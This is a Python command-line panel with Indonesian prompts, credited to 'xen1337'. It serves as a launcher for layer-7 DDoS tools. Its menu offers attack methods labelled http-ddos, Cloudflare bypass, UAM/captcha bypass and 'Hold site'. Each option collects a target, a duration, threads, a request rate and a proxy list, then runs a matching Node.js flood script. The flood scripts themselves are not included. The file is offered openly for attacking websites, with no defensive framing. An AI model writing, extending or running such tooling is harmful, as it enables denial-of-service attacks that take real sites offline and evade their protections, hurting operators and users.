# yang di kembangkan oleh xen1337 <3
import subprocess
import os
from os import name, system

if name == 'nt':
    system("title A18 - BROWSER")
    system("mode 101, 30")

# untuk melakukan run script nodejs
def run_script(script_name, args):
    command = ['node', script_name] + args
    subprocess.run(command)

# daptar menu extrax froxy
def count_proxy(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = file.readlines()
    # daptar menu proxyfile
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return len(proxies)

# tampilan menu untuk script
def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("\033[34m       WELCOME TO LOTUS\033[38m")
    print("")
    print()
    print("============= Method layer 7 ============")
    print("  ==> VVIP")
    print("  [1] - BYPASS    [bypass uam/captcha]")
    print("  [2] - HTTP          [http-ddos]")
    print("  [3] - POSAIDON           [cf-bypass]")
    print("  [4] - PLUTO         [Hold site]")
    print("  [5] - STRIKE        [cloudflare]")
    print("  [6] - TLS           [power full]")
    print("  [7] - TLSCLF        [basic site]")
    print("  [0] - EXIT")
    print("=========================================")

# tampilan menu untuk attack
def handle_menu_selection(selection):
    if selection == '1':
        print("\n============== BYPASS ==============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        requests = input("  masukan requests per IP: ")
        mode = input("  masukan mode : ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("============== BYPASS ==============")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Requests per IP: {requests}")
        print(f"  Mode: {mode}")
        print("=========================================")
        input("   tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('BYPASS.js', [target, time, thread, proxy_file, requests, mode])

    elif selection == '2':
        print("\n================= HTTP ================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== HTTP ==============")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('HTTP.js', [target, time, requests, thread, proxy_file])

    elif selection == '3':
        print("\n================= POSAIDON =================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= POSAIDON =================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('POSAIDON.js', [target, time, requests, thread, proxy_file])

    elif selection == '4':
        print("\n================= PLUTO ================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= PLUTO ================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('PLUTO.js', [target, time, requests, thread, proxy_file])

    elif selection == '5':
        print("\n================== STRIKE ==================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================== STRIKE ==================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('STRIKE.js', [target, time, requests, thread, proxy_file])

    elif selection == '6':
        print("\n=============== TLS ==============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== TLS ==============")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekaan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('TLS.js', [target, time, requests, thread, proxy_file])

    elif selection == '7':
        print("\n================ TLSCLF ===============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================ TLSCLF ================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("==========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('TLSCLF.js', [target, time, requests, thread, proxy_file])

    else:
        print("  terimakasih.")

# Focket panel
def start_panel():
    while True:
        show_menu()
        selection = input("  pilih no untuk attack (0-7): ")
        
        if selection == '0':
            break
        
        if selection not in ['1', '2', '3', '4', '5', '6', '7']:
            print("  daptar no untuk melakukan serangan.")
            continue
        
        handle_menu_selection(selection)

# xen1337 panel
start_panel()

# https://github.com/llolyppop
